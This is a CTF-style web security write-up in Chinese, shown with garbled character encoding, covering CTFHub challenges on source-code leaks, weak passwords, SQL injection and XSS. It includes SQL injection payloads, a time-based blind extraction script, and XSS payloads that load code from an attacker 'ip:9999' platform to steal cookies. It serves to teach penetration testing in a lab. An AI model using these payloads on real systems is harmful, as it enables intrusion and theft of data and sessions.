æ˜¯phpä¸­æŸ¥çœ‹ç›¸å…³ä¿¡æ¯çš„å‡½æ•°ï¼Œå½“åœ¨é¡µé¢ä¸­æ‰§è¡Œphpinfo()å‡½æ•°æ—¶ï¼Œphpä¼šå°†è‡ªèº«çš„æ‰€æœ‰ä¿¡æ¯å…¨éƒ¨æ‰“å°å‡ºæ¥ã€‚åœ¨phpinfoä¸­ä¼šæ³„éœ²å¾ˆå¤šæœåŠ¡ç«¯çš„ä¸€äº›ä¿¡æ¯ï¼š ä¾‹å¦‚å®‰è£…çš„ä¸€äº›æ¨¡å—ã€ç½‘ç«™ç»å¯¹è·¯å¾„ã€æœåŠ¡å™¨è‡ªèº«çš„æ“ä½œç³»ç»Ÿã€ä½¿ç”¨çš„ç»„ä»¶ç‰ˆæœ¬ç­‰ç­‰ï¼Œåœ¨phpinfoä¸­è·å¾—çš„è¿™äº›ä¿¡æ¯ä¼šä¸ºä¸‹ä¸€æ­¥çš„æ¸—é€/åšé¢˜æä¾›ä¸€äº›å¸®åŠ© ç‚¹å‡»æŸ¥çœ‹phpinfoï¼Œå…¨å±€æœç´¢flagï¼Œåœ¨ç¯å¢ƒå˜é‡ä¸­æ‰¾åˆ°lfag å¤‡ä»½æ–‡ä»¶ä¸‹è½½ ç½‘ç«™æºç  é¢˜ç›®æè¿°ï¼šå½“å¼€å‘äººå‘˜åœ¨çº¿ä¸Šç¯å¢ƒä¸­å¯¹æºä»£ç è¿›è¡Œäº†å¤‡ä»½æ“ä½œï¼Œå¹¶ä¸”å°†å¤‡ä»½æ–‡ä»¶æ”¾åœ¨äº† web ç›®å½•ä¸‹ï¼Œå°±ä¼šå¼•èµ·ç½‘ç«™æºç æ³„éœ²ã€‚ è®¿é—®www.zipå¾—åˆ°äº†ä¸€ä¸ªå‹ç¼©åŒ… æ ¹æ®æç¤ºè®©æˆ‘ä»¬ä¼°è®¡æ˜¯è®©æˆ‘ä»¬è®¿é—®è¯¥æ–‡ä»¶ æ‹¿åˆ°flag bakæ–‡ä»¶ æœ‰äº›æ—¶å€™ç½‘ç«™ç®¡ç†å‘˜å¯èƒ½ä¸ºäº†æ–¹ä¾¿ï¼Œä¼šåœ¨ä¿®æ”¹æŸä¸ªæ–‡ä»¶çš„æ—¶å€™å…ˆå¤åˆ¶ä¸€ä»½ï¼Œå°†å…¶å‘½åä¸ºxxx.bakã€‚è€Œå¤§éƒ¨åˆ†Web Serverå¯¹bakæ–‡ä»¶å¹¶ä¸åšä»»ä½•å¤„ç†ï¼Œå¯¼è‡´å¯ä»¥ç›´æ¥ä¸‹è½½ï¼Œä»è€Œè·å–åˆ°ç½‘ç«™æŸä¸ªæ–‡ä»¶çš„æºä»£ç  è¿™é‡Œæ˜¯bakæ–‡ä»¶æ³„éœ²ï¼Œç›´æ¥è®¿é—®index.php.bakå³å¯ vimç¼“å­˜ å½“å¼€å‘äººå‘˜åœ¨çº¿ä¸Šç¯å¢ƒä¸­ä½¿ç”¨ vim ç¼–è¾‘å™¨ï¼Œåœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­ä¼šç•™ä¸‹ vim ç¼–è¾‘å™¨ç¼“å­˜ï¼Œå½“vimå¼‚å¸¸é€€å‡ºæ—¶ï¼Œç¼“å­˜ä¼šä¸€ç›´ç•™åœ¨æœåŠ¡å™¨ä¸Šï¼Œå¼•èµ·ç½‘ç«™æºç æ³„éœ²ã€‚ vim äº¤æ¢æ–‡ä»¶å åœ¨ä½¿ç”¨vimæ—¶ä¼šåˆ›å»ºä¸´æ—¶ç¼“å­˜æ–‡ä»¶ï¼Œå…³é—­vimæ—¶ç¼“å­˜æ–‡ä»¶åˆ™ä¼šè¢«åˆ é™¤ï¼Œå½“vimå¼‚å¸¸é€€å‡ºåï¼Œå› ä¸ºæœªå¤„ç†ç¼“å­˜æ–‡ä»¶ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡ç¼“å­˜æ–‡ä»¶æ¢å¤åŸå§‹æ–‡ä»¶å†…å®¹ ä»¥ index.php ä¸ºä¾‹ï¼šç¬¬ä¸€æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åä¸º .index.php.swp å†æ¬¡æ„å¤–é€€å‡ºåï¼Œå°†ä¼šäº§ç”Ÿåä¸º .index.php.swo çš„äº¤æ¢æ–‡ä»¶ ç¬¬ä¸‰æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åˆ™ä¸º .index.php.swn æ ¹æ®ä¸Šè¿°æç¤ºæˆ‘ä»¬è®¿é—®.index.php.swpå¾—åˆ°æºç  .DS_Store .DS_Store æ˜¯ Mac OS ä¿å­˜æ–‡ä»¶å¤¹çš„è‡ªå®šä¹‰å±æ€§çš„éšè—æ–‡ä»¶ã€‚é€šè¿‡.DS_Storeå¯ä»¥çŸ¥é“è¿™ä¸ªç›®å½•é‡Œé¢æ‰€æœ‰æ–‡ä»¶çš„æ¸…å•ã€‚ ç›´æ¥è®¿é—®/.DS_Storeè®¿é—®å¾—åˆ°ä¸‹è½½æ–‡ä»¶ï¼Œä¸è¿‡å†…å®¹è‚‰çœ¼éš¾è¾¨ï¼Œéœ€è¦å·¥å…· è¿™é‡Œæˆ‘ä»¬ç”¨åˆ°äº† Python-dsstore è¿™ä¸ªå·¥å…· (https://github.com/gehaxelt/Python-dsstore) æ¥å®Œæˆ .DS_Store æ–‡ä»¶çš„è§£æï¼š è®¿é—®å³å¯ Gitæ³„éœ² Git-Log é¢˜ç›®æè¿°ï¼šå½“å‰å¤§é‡å¼€å‘äººå‘˜ä½¿ç”¨gitè¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“,å¯èƒ½ä¼šå°†.gitæ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº†gitæ³„éœ²æ¼æ´ã€‚è¯·å°è¯•ä½¿ç”¨BugScanTeamçš„GitHackå®Œæˆæœ¬é¢˜ ç›´æ¥ä¸Šå·¥å…·ã€‚ å…‹éš†å¥½æºä»£ç ä¹‹åï¼Œgit logæŸ¥çœ‹å†å²è®°å½• å‘ç°flagï¼Œå½“å‰æ‰€å¤„çš„ç‰ˆæœ¬ä¸º remove flagï¼Œflag åœ¨ add flag è¿™æ¬¡æäº¤ä¸­ è§£æ³•ä¸€ï¼š ç›´æ¥ä¸ add flag (95819c) è¿™æ¬¡æäº¤è¿›è¡Œæ¯”å¯¹ git diff 3e25d # æˆ–è€… git diff HEAD^ è§£æ³•äºŒï¼š ç›´æ¥åˆ‡æ¢åˆ° add flag (3e25d) è¿™ä¸ªç‰ˆæœ¬ git reset --hard 3e25d # æˆ– git reset --hard HEAD^ Git-Stash è€ƒç‚¹ git æ³„éœ² .git/refs/stash stash ç”¨äºä¿å­˜ git å·¥ä½œçŠ¶æ€åˆ° git æ ˆï¼Œåœ¨éœ€è¦çš„æ—¶å€™å†æ¢å¤ã€‚ git stash lish #æŸ¥çœ‹å½“å‰stashä¸­çš„å†…å®¹ git stash pop #å°†å½“å‰stashä¸­çš„å†…å®¹å¼¹å‡ºï¼Œå¹¶åº”ç”¨åˆ°å½“å‰åˆ†æ”¯å¯¹åº”çš„å·¥ä½œç›®å½•ä¸Š,å¯ä»¥ç†è§£ä¸ºæ¢å¤å†…å®¹ã€‚ å…‹éš†å¥½æºç ä¹‹åï¼š è§£æ³•ä¸€ï¼š æ‰§è¡Œ git stash list å‘ç°æœ‰ stash æ‰§è¡Œ git stash pop å‘ç°ä» git æ ˆä¸­å¼¹å‡ºæ¥ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶çš„å†…å®¹å°±æ˜¯ flag è§£æ³•äºŒï¼š å¦‚æœä½ ä½¿ç”¨çš„ GitHack å·¥å…·æ‰§è¡Œå®Œ git stash show ä¹‹åæ²¡æœ‰æ˜¾ç¤º stash è®°å½•ï¼Œé‚£ä¹ˆä¸å¦¨æ¥å°è¯•è¿™ä¸ªæ–¹æ³• æŸ¥çœ‹ .git/refs/stash æ‰¾åˆ° stash å¯¹åº”çš„ hash git diff 25bfc å³å¯çœ‹åˆ° flagâ€“ä½†æˆ‘è¿™é‡Œæ²¡æœ‰æ˜¾ç¤ºï¼Œå¯èƒ½æ˜¯ç¯å¢ƒæ²¡äº†çš„é—®é¢˜ Git-Index é¢˜ç›®ä¸­çš„indexå¹¶ä¸æ˜¯æˆ‘ä»¬ç†è§£çš„webç½‘é¡µï¼Œè€Œæ˜¯ä¸€ä¸ªæš‚å­˜åŒºï¼Œé»˜è®¤å­˜å‚¨åœ¨.git/indexã€‚ å…³äºindexçš„å…·ä½“çŸ¥è¯†ç‚¹å¤§å®¶å¯ä»¥é˜…è¯»ä¸€ä¸‹è¿™ä¸ªæ–‡ç« ï¼š(Gitæœ¬åœ°åº“ä¸­çš„ç´¢å¼•ï¼ˆIndexï¼‰åŠæ–‡ä»¶çŠ¶æ€æ¦‚è¿°_æ˜“ç”Ÿä¸€ä¸–çš„åšå®¢-CSDNåšå®¢ git checkout-indexå‘½ä»¤ å°†Indexä¸­åˆ—è¡¨çš„æ–‡ä»¶æ£€å‡ºåˆ°å·¥ä½œç›®å½•ï¼Œé»˜è®¤ä¸è¦†ç›–å·²æœ‰æ–‡ä»¶ã€‚ -u, --indexï¼Œæ›´æ–°æ‰€æœ‰æ£€å‡ºçš„æ–‡ä»¶çš„statä¿¡æ¯ï¼ˆgit statusï¼‰ -a, --allï¼Œæ£€å‡ºIndexä¸­åˆ—è¡¨çš„æ‰€æœ‰æ–‡ä»¶ -f, --forceï¼Œæ£€å‡ºæ—¶è¦†ç›–å·²æœ‰æ–‡ä»¶ -n, --no-createï¼Œåªå†æ¬¡æ£€å‡ºå·¥ä½œç›®å½•ä¸­å·²æœ‰çš„æ–‡ä»¶ï¼ˆä¸åˆ›å»ºä»»ä½•æ–°æ–‡ä»¶ï¼‰ --ï¼Œç¦ç”¨ä»»ä½•å‚æ•° è¿™é‡Œæˆ‘æ˜¯ç›´æ¥è¯»å–indexç›®å½•ï¼Œç»“æœçœ‹åˆ°å½“å‰ç›®å½•ä¸‹å¤šäº†ä¸ªtxtæ–‡ä»¶ï¼Œç›´æ¥è¯»å–å¾—åˆ°flag SVNæ³„éœ² å½“å¼€å‘äººå‘˜ä½¿ç”¨ SVN è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“,å¯èƒ½ä¼šå°†.svnæ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº† SVN æ³„éœ²æ¼æ´ã€‚ å¦‚æœè®¿é—®url/.svn/entriesæœ‰ååº”çš„è¯ï¼Œå°±å­˜åœ¨svnæ³„éœ²ã€‚ç›´æ¥ä¸Šå·¥å…·åˆ©ç”¨ï¼šhttps://github.com/kost/dvcs-ripper --æœ€å¥½åœ¨kaliå®‰è£… å®‰è£…æ•™ç¨‹å‚è€ƒï¼šctfhubâ€“svnæ³„éœ² å®‰è£…å¥½è¾“å…¥ä»¥ä¸‹å‘½ä»¤ ./rip-svn.pl -v -u url è¿™é‡Œå¿…é¡»è¦ls -alæ‰èƒ½çœ‹åˆ°æ¢å¤çš„.svnæ–‡ä»¶ï¼Œä¹‹åtree .svnæŸ¥çœ‹æ–‡ä»¶ç›®å½•ç»“æ„ flagåœ¨æ­¤ç›®å½•ä¸‹ï¼Œè¯»å–å³å¯ HGæ³„éœ² å½“å¼€å‘äººå‘˜ä½¿ç”¨ Mercurial è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“,å¯èƒ½ä¼šå°†.hg æ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº† hg æ³„éœ²æ¼æ´ã€‚ å·¥å…·ä¾æ—§æ˜¯ä¸Šè¿°çš„ è¿™é‡Œæµ‹è¯•äº†åŠå¤©ï¼Œä»¥ä¸ºèƒ½åœ¨æ­¤ç›´æ¥è¯»åˆ°flagçš„ï¼Œç»“æœçœ‹äº†wpå‘ç°ç›´æ¥è®¿é—®å°±è¡Œã€‚ã€‚ã€‚å®åœ¨æ˜¯æ²¡æƒ³åˆ° æˆ–è€…å¦‚æœè¿™é‡Œåˆ æ‰äº†è¯¥æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•è¯»å–å†å²æ–‡ä»¶ï¼šè·¯å¾„æ˜¯ .hg/store/data/flag__2096222060.txt.i æ³¨æ„ä¸‹åˆ’çº¿æ˜¯ä¸¤ä¸ª å½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥curlè®¿é—® å¯†ç å£ä»¤ å¼±å£ä»¤ é€šå¸¸è®¤ä¸ºå®¹æ˜“è¢«åˆ«äººï¼ˆä»–ä»¬æœ‰å¯èƒ½å¯¹ä½ å¾ˆäº†è§£ï¼‰çŒœæµ‹åˆ°æˆ–è¢«ç ´è§£å·¥å…·ç ´è§£çš„å£ä»¤å‡ä¸ºå¼±å£ä»¤ã€‚ è¿™é‡Œå°è¯•äº†å‡ ä¸‹ï¼Œadmin+123456å³å¯ é»˜è®¤å£ä»¤ é¢˜ç›®è¯´äº†æ˜¯é»˜è®¤å£ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥è°·æ­Œå…³é”®è¯æœç´¢ä¸€æ‰‹ è¿™é‡Œä¹Ÿæ˜¯é¡ºåˆ©çš„åœ¨wooyunçœ‹äº†åˆ°å…¬å¼€çš„æ¼æ´ï¼Œæˆ‘ä»¬å°è¯•ä¸€ä¸‹ä¸Šè¿°ä¸‰ä¸ªè´¦å·ï¼Œç¬¬äºŒä¸ªæ˜¯æˆåŠŸçš„ï¼Œå¦‚ä¸‹å›¾ SQLæ³¨å…¥ æ•´æ•°å‹æ³¨å…¥ åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹ï¼š ?id=1 and 1=1 ?id=1 and 1=2 å¯ä»¥å‘ç°é¡µé¢å›æ˜¾ä¸ä¸€æ ·ã€‚è¯´æ˜æ˜¯æ•°å­—å‹ï¼Œç›´æ¥å¼€å§‹æ³¨å…¥å³å¯ã€‚è¿™é‡Œåˆ¤æ–­å­—æ®µæ•°æ˜¯2 çˆ†åº“ï¼š?id=-1 union select 1,database() çˆ†è¡¨åï¼š?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() çˆ†åˆ—åï¼š?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag' çˆ†æ•°æ®ï¼š?id=-1 union select 1,flag from flag å½“ç„¶sqlmapå°±æ›´ç®€å•äº† å­—ç¬¦å‹æ³¨å…¥ å¾ˆç®€å•ï¼Œåªä¸è¿‡éœ€è¦å¼•å·é—­åˆä¸€ä¸‹ï¼Œåé¢ç”¨â€“+æ³¨é‡Šæ‰å³å¯ï¼Œä¸èµ˜è¿°äº† ?id=-1' union select 1,flag from flag--+ æŠ¥é”™æ³¨å…¥ ç®€å•çš„æŠ¥é”™æ³¨å…¥ï¼Œä¸éœ€è¦é—­åˆï¼Œç›´æ¥ä¸Špayloadå³å¯ ?id=1 and updatexml(1,concat(0x7e,database()),1) å¾—åˆ°flagï¼š?id=1 and updatexml(1,concat(0x7e,select flag from flag),1) ä¸è¿‡æŠ¥é”™æ˜¾ç¤ºçš„å­—ç¬¦æœ‰é™ï¼Œæˆ‘ä»¬çˆ†å‡ºååŠéƒ¨åˆ†å³å¯ ?id=1 and updatexml(1,concat(0x7e,substring((select flag from flag),15,40)),1) å®Œæ•´ï¼šctfhub{51f61213dc2a24ab5fc09fc7} å¸ƒå°”ç›²æ³¨ ?id=1 and 1=1 ?id=1 and 1=2 å¦‚ä¸Šï¼Œé¡µé¢åªæœ‰ä¸¤ç§å›æ˜¾ï¼Œåªèƒ½ç›²æ³¨ï¼Œå†™è„šæœ¬ï¼ŒäºŒåˆ†æ³•æ›´å¿«ã€‚æˆ–è€…sqlmap import time import requests url = 'http://challenge-f1141910229dba2a.sandbox.ctfhub.com:10800/?id=' flag = \"\" for i in range(1, 100): left = 32 right = 128 mid = (left + right) // 2 while left &lt; right: payload = url + f\"1 and if(ascii(substr((select flag from flag),{i},1))&gt;{mid},sleep(2),0)#\" start_time = time.time() response = requests.get(payload).text end_time = time.time() use_time = end_time - start_time if use_time &gt; 2: left = mid + 1 else: right = mid mid = (left + right) // 2 print(mid) flag += chr(mid) print(flag) æ—¶é—´ç›²æ³¨ ?id=1 and sleep(1) ?id=1 and sleep(5) ç®€å•æµ‹è¯•ä¸€ä¸‹å‘ç°é¡µé¢å›æ˜¾æœ‰æ‰€å»¶è¿Ÿï¼Œç¡®å®šä¸ºæ—¶é—´ç›²æ³¨ã€‚ä¸Šè„šæœ¬æˆ–è€…ï¼Œsqlmap import time import requests url = 'http://challenge-3252dd76021b94e3.sandbox.ctfhub.com:10800/?id=' flag = \"\" for i in range(1, 100): left = 32 right = 128 mid = (left + right) // 2 while left &lt; right: payload = url + f\"1 and if(ascii(substr((select flag from flag),{i},1))&gt;{mid},sleep(2),0)#\" start_time = time.time() response = requests.get(payload).text end_time = time.time() use_time = end_time - start_time if use_time &gt; 2: left = mid + 1 else: right = mid mid = (left + right) // 2 #print(mid) flag += chr(mid) print(\"flag:\", flag) MySQLç»“æ„ è¿™é“é¢˜ä¹Ÿä¸çŸ¥é“ä»€ä¹ˆå«ä¹‰ï¼Œè€ƒç‚¹å’Œæ•´æ•°å‹æ³¨å…¥ä¼¼ä¹æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡æ¢äº†äº›åå­—ï¼Œè¿‡ç¨‹ä¸èµ˜è¿°äº†ï¼Œç›´æ¥ç»™ç»“æœ ?id=-1 union select 1,oifqtgzzzi from cjpyvsldua Cookieæ³¨å…¥ æç¤ºæˆ‘ä»¬åœ¨cookieå¤„ å¦‚ä¸Šå›¾ï¼ŒæˆåŠŸçˆ†åº“ï¼Œæ¥ä¸‹æ¥çˆ†è¡¨ id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() çˆ†åˆ—å id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='asdlhojeyd' çˆ†æ•°æ® id=-1 union select 1,tbslnjukkx from asdlhojeyd UAæ³¨å…¥ çœ‹æ•°æ®å°±çŸ¥é“æ³¨å…¥ç‚¹åœ¨UAå¤´å¤„ï¼Œç›´æ¥ä¿®æ”¹å³å¯ï¼Œæ­¥éª¤åŒä¸Šï¼Œä¸å†èµ˜è¿° Refereræ³¨å…¥ ç›´æ¥åœ¨refererå¤´å¤„è¾“å…¥SQLè¯­å¥å³å¯ï¼Œä¸å†èµ˜è¿° è¿‡æ»¤ç©ºæ ¼ é¢˜ç›®è¯´äº†è¿‡æ»¤ç©ºæ ¼ï¼Œç›´æ¥é‡‡ç”¨%0aæˆ–è€…å†…è”æ³¨é‡Šç¬¦ç»•è¿‡å³å¯ ?id=-1/**/union/**/select/**/1,zfbvfsfjmz/**/from/**/lyvloeyoue XSS XSS-åå°„å‹ é¢˜ç›®è¯´æ˜¯åå°„å‹ï¼Œæˆ‘ä»¬å…ˆç®€å•æµ‹è¯•ä¸€ä¸‹ çš„ç¡®å­˜åœ¨ï¼Œè€Œä¸”æ²¡æœ‰è¿‡æ»¤ï¼Œé‚£æˆ‘ä»¬åˆ†æä¸€ä¸‹ä¸‹é¢çš„Botçš„å«ä¹‰ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“å¦‚æœç½‘ç«™å­˜åœ¨xssçš„è¯ï¼Œå…¶å±å®³é€šå¸¸æ¥è¯´å°±æ˜¯è·å–å…¶ä»–ç”¨æˆ·ç”šè‡³æ˜¯ç®¡ç†å‘˜çš„cookieï¼Œå¯†ç ç­‰ç­‰ä¿¡æ¯ï¼Œé‚£æˆ‘ä»¬è¾“å…¥æ¶æ„xssä»£ç ï¼Œè‚¯å®šéœ€è¦æœ‰äººå»è®¿é—®æˆ–è€…ç‚¹å‡»ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬æ‰èƒ½è·å¾—ä»–ä»¬cookieç­‰ä¿¡æ¯ï¼Œè€Œä¸‹é¢çš„Botå°±æ˜¯å­˜åœ¨ä¸€ä¸ªæœºå™¨äººå»æ¨¡ä»¿åˆ«çš„ç”¨æˆ·æˆ–è€…ç®¡ç†å‘˜å»ç‚¹å‡»æˆ‘ä»¬çš„æ¶æ„xssä»£ç ï¼Œä»è€Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å…¶cookieã€‚ é‚£æ¥ä¸‹æ¥å°±éœ€è¦æˆ‘ä»¬çš„xssplatformäº†ï¼Œæ¯•ç«Ÿbotç‚¹å‡»ä¹‹ååªä¼šæ˜¾ç¤ºsuccessï¼Œå…¶cookieæˆ‘ä»¬æ— æ³•å¾—çŸ¥ï¼Œéœ€è¦é€šè¿‡xsså¹³å°æ¥è·å–cookieã€‚å»ºè®®æ˜¯è‡ªå·±ç”¨vpsæ­ä¸€ä¸ªå¹³å°ï¼Œè¿™é‡Œæˆ‘å·²ç»æ­å»ºå¥½ï¼Œéšåå»ºä¸€ä¸ªé¡¹ç›®ï¼Œé…ç½®é»˜è®¤å³å¯ã€‚ éšä¾¿å¤åˆ¶ä¸€ä¸ªï¼Œå…ˆæäº¤è‡³ä¸Šé¢çš„è¾“å…¥æ¡† æ¥ä¸‹æ¥å°†å¾—åˆ°çš„urlä¼ åˆ°ä¸‹é¢çš„botè®©å…¶è‡ªåŠ¨ç‚¹å‡» é¡µé¢æ˜¾ç¤ºsuccessä¹‹åæˆ‘ä»¬åˆ°xssåå°å°±å¯ä»¥çœ‹åˆ°cookieä¿¡æ¯äº† XSS-å­˜å‚¨å‹ è¿™é‡ŒåŒæ ·å°†ä¸Šè¿°çš„xssä»£ç ä¼ å…¥ä¸Šé¢çš„è¾“å…¥æ¡†ï¼Œä¼ å…¥ä¹‹åè¿™ä¸ªæ¶æ„ä»£ç å°±è¢«å­˜å…¥äº†å¯¹æ–¹çš„ï¼ˆå—å®³è€…ï¼‰æœåŠ¡å™¨ä¸­ï¼Œéšåå°†é¶åœºåœ°å€è¾“å…¥åˆ°ä¸‹é¢çš„botä¸­ï¼Œå…¶åæ¯å½“botè®¿é—®è¯¥ç½‘å€ï¼Œå°±ç›¸å½“äºæ‰§è¡Œä¸€æ¬¡æˆ‘ä»¬æ¶æ„ä»£ç ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨xsså¹³å°å°±å¯ä»¥è·å¾—cookie XSS-DOMåå°„ DOMåå°„è¯´ç™½äº†ï¼Œå°±æ˜¯å®¡è®¡å‰ç«¯çš„jsä»£ç ï¼Œè¿™ç§xssæ˜¯åå°„å‹çš„å˜ç§ï¼Œä»–ä¸éœ€è¦å»æœåŠ¡å™¨ç«¯è¿›è¡Œäº¤äº’ï¼Œç›´æ¥å°±åœ¨å‰ç«¯å°†æ’å…¥çš„jsä»£ç æ¸²æŸ“äº†ï¼Œä¹Ÿå°±æ˜¯è¿™å®Œå…¨æ˜¯å®¢æˆ·ç«¯çš„äº‹æƒ…ã€‚ æ‰€ä»¥é‡åˆ°è¿™ç§åå°„ï¼Œæˆ‘ä»¬é€šå¸¸éœ€è¦è€ƒè™‘å¦‚ä½•é—­åˆå…¶ä»£ç ï¼Œä»è€Œå°†æˆ‘ä»¬çš„æ¶æ„jsä»£ç å¾—åˆ°æ‰§è¡Œ è¿™é‡Œæˆ‘ä»¬ç®€å•æµ‹è¯•å‘ç°æˆ‘ä»¬è¾“å…¥çš„å†…å®¹æ’å…¥åˆ°äº†è¿™ä¸ªinnerHTMLä¸­ï¼Œä½†ç”±äºå…¶è¢«å½“æˆäº†å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¿™ä¸ªæ¶æ„jsä»£ç æ— æ³•æ‰§è¡Œï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è€ƒè™‘é—­åˆã€‚å€˜è‹¥æˆ‘ä»¬æ„é€ ä¸‹åˆ—payloadï¼š ';&lt;/script&gt;&lt;script&gt;alert('hacker')&lt;/script&gt;// //è¿™æ ·çš„è¯æˆ‘ä»¬å°±å°†å‰é¢çš„scriptæ ‡ç­¾è¿›è¡Œäº†é—­åˆ,åç»­é€šè¿‡//è¿›è¡Œæ³¨é‡Š,æˆ‘ä»¬çš„jsä»£ç å¾—ä»¥æˆåŠŸæ‰§è¡Œ //æ¥ä¸‹æ¥å°†ä¸Šåˆ—payloadæ›¿æ¢ä¸ºæˆ‘ä»¬xsså¹³å°çš„ä»£ç å³å¯,æœ€åå°†å¾—åˆ°çš„urlæäº¤ç»™botè®©å…¶ç‚¹å‡»,è§‚å¯Ÿå¹³å°å“åº”å³å¯ æˆåŠŸæ‹¿åˆ°flag XSS-DOMè·³è½¬ è¿™é‡Œä¹Ÿæ˜¯æœ‰ç‚¹è’™è”½ï¼Œå°±çœ‹wpäº† &lt;script&gt; //è·å–äº†å½“å‰é¡µé¢çš„URLæŸ¥è¯¢éƒ¨åˆ†ï¼ˆå³location.searchï¼‰ var target = location.search.split(\"=\") //ç„¶åä½¿ç”¨split(\"=\")æ–¹æ³•å°†æŸ¥è¯¢å‚æ•°åˆ†å‰²æˆæ•°ç»„ã€‚è¿™å°†å¯¼è‡´targetå˜é‡åŒ…å«ä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯æŸ¥è¯¢å‚æ•°åï¼Œç¬¬äºŒä¸ªå…ƒç´ æ˜¯æŸ¥è¯¢å‚æ•°å€¼ã€‚ //å®ƒæ£€æŸ¥æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„å‰¥ç¦»åæ˜¯å¦ç­‰äºå­—ç¬¦ä¸²\"jumpto\" //slice(1)æ˜¯ç”¨æ¥å»æ‰å‚æ•°åå‰é¢çš„é—®å·å­—ç¬¦(\"?\")çš„ if (target[0].slice(1) == \"jumpto\") { //å°†é¡µé¢çš„location.hrefå±æ€§è®¾ç½®ä¸ºæŸ¥è¯¢å‚æ•°çš„å€¼ï¼Œä»è€Œå¯¼è‡´é¡µé¢é‡å®šå‘åˆ°è¯¥å€¼æ‰€æŒ‡å®šçš„URLã€‚ location.href = target[1]; } &lt;/script&gt; è¿™é‡Œæ˜¯æ¼æ´ç‚¹ï¼Œå¯è§è¿™é‡Œæˆ‘ä»¬éœ€è¦getä¼ ä¸€ä¸ªjumptoçš„å‚æ•°ï¼Œå¹¶åœ¨=åé¢é™„ä¸Šæˆ‘ä»¬çš„æ¶æ„jsä»£ç ï¼Œä½†æ­¤å¤„æˆ‘å¹¶ä¸æ¸…æ¥šå¦‚ä½•æ·»åŠ ï¼Œçœ‹äº†wpå‘ç°æ˜¯çŸ¥è¯†ç›²åŒºï¼š æ³¨æ„ï¼å½“ä½ å°†ç±»ä¼¼äº location.href = â€œjavascript:alert(â€˜xssâ€™)â€ è¿™æ ·çš„ä»£ç èµ‹å€¼ç»™ location.href æ—¶ï¼Œæµè§ˆå™¨ä¼šå°†å…¶è§£é‡Šä¸ºä¸€ç§ç‰¹æ®Šçš„URLæ–¹æ¡ˆï¼Œå³ â€œjavascript:â€ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨ä¼šå°†åé¢çš„ JavaScript ä»£ç ä½œä¸ºURLçš„ä¸€éƒ¨åˆ†è¿›è¡Œè§£æï¼Œç„¶åæ‰§è¡Œå®ƒã€‚ æ‰€ä»¥æœ‰å¦‚ä¸‹payloadï¼š http://challenge-a0657aa32a9d9134.sandbox.ctfhub.com:10800/?jumpto=javascript:$.getScript(\"//ip:9999//9GXMk4\") è¿™æ®µä»£ç ä½¿ç”¨äº† jQuery çš„ $.getScript() å‡½æ•°æ¥å¼‚æ­¥åŠ è½½å¹¶æ‰§è¡Œæ¥è‡ª xsså¹³å° çš„ js è„šæœ¬ï¼Œä½¿ç”¨å‰ææ˜¯ç½‘ç«™å¼•ç”¨äº†jQueryã€‚ æ‹¿åˆ°flag XSS-è¿‡æ»¤ç©ºæ ¼ ç®€å•æµ‹è¯•ä¸€ä¸‹çŸ¥é“è¿‡æ»¤äº†ç©ºæ ¼ï¼ŒæŸ¥è¯¢ä¸€ç•ªå¯ä»¥çŸ¥é“é€šè¿‡/**/æˆ–è€…/ç¬¦å·å³å¯ç»•è¿‡ï¼ŒåŸå§‹payloadå¦‚ä¸‹ï¼š &lt;/textarea&gt;'\"&gt;&lt;script src=http://ip:9999/9GXMk4&gt;&lt;/script&gt; ä¿®æ”¹å¦‚ä¸‹ï¼š &lt;/textarea&gt;'\"&gt;&lt;script/src=http://ip:9999/9GXMk4&gt;&lt;/script&gt; ä¹‹åè€åŠæ³•å³å¯ XSS-è¿‡æ»¤å…³é”®è¯ ç®€å•æµ‹è¯•çŸ¥é“è¿‡æ»¤äº†scriptå…³é”®è¯ï¼Œå°è¯•åŒå†™æˆåŠŸç»•è¿‡ã€‚ &lt;/textarea&gt;'\"&gt;&lt;scriscriptpt/src=http://ip:9999/9GXMk4&gt;&lt;/scriscriptpt&gt; æ–‡ä»¶ä¸Šä¼  æ— éªŒè¯ 